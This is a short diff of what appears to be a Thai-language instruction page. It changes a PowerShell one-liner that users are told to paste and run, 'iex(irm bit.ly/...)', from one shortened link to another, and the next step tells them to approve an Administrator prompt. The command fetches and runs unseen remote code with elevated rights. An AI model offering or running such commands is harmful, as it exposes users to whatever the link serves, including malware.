@@ -26,7 +26,7 @@
    วางโค้ดนี้ลงไป แล้วกด **Enter**
    
    ```powershell
-    iex(irm bit.ly/fixupdate)
+    iex(irm bit.ly/shutdownfix)
     ```
    
 3. ระบบจะขอสิทธิ์ Administrator อัตโนมัติ (ให้กด Yes)
